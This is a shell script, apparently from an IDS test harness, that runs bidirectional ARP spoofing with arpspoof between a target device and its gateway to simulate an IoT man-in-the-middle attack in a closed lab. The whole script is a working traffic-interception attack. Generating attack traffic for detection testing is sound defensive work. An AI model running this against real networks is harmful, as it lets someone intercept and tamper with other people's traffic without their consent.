#!/bin/sh
# IoT MITM simulation — ARP-spoofs between a home-network device and the gateway
# to produce a man-in-the-middle traffic signature for IDS evaluation (closed lab).
echo "[IOT-MITM] Starting..."
TARGET="${TARGET_HOST:-172.20.0.10}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"
# Gateway defaults to .1 of the target's /24 unless GATEWAY is provided
GATEWAY="${GATEWAY:-$(echo "$TARGET" | sed 's/\.[0-9]*$/.1/')}"
IFACE="${IFACE:-eth0}"
END=$(($(date +%s) + DURATION))

# Intensity -> spoofed-packet send interval (seconds); lower = more aggressive
case "$INTENSITY" in
    low)    INTERVAL=5 ;;
    high)   INTERVAL=1 ;;
    *)      INTERVAL=2 ;;  # medium
esac

# Poison both directions so the attacker sits between device and gateway
arpspoof -i "$IFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
SPOOF1=$!
arpspoof -i "$IFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
SPOOF2=$!

while [ $(date +%s) -lt $END ]; do
    sleep "$INTERVAL"
done

kill "$SPOOF1" "$SPOOF2" 2>/dev/null
echo "[IOT-MITM] Done."
